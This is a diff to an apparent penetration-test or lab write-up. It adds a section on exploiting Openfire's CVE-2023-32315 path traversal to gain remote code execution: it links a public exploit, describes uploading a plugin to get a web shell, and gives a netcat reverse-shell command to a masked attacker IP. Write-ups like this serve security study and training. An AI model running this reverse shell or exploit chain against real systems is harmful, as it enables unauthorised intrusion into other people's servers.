@@ -48,7 +48,22 @@ Error received, connection timed out.
 Port 9090 open to a "Openfire Admin Console." The currently running version of Openfire is v4.7.3. After researching, this version is linked directly to CVE-2023-32315 and is vulnerable to remote code execution (RCE).
 
 
+
+
+
 # Service Enumeration
+
+CVE-2023-32315 states that version 3.10.0 - 4.7.4 are vulnerable to a path traversal attach in the setups environment which allows users to perform remote code execution. 
+
+Since this is a known CVE, we can us this exploit written by *miko550* to gain a foothold on the target machine -> https://github.com/miko550/CVE-2023-32315
+
+Using this exploit we create a credible user account to login to the Openfire admin console, manually upload a .jar plugin to change the system command password, and finally are able to run system commands via the web shell under the "server settings" management tool page.
+
+After multiple attempts at receiving a reverse shell, the connection was finally achieved through the busybox command
+
+	busybox nc 192.168.XXX.XXX 80 -e sh
+
+Successfully, we now have a direct foothold as the "openfire" user.
 
 
 # Privilege Escalation
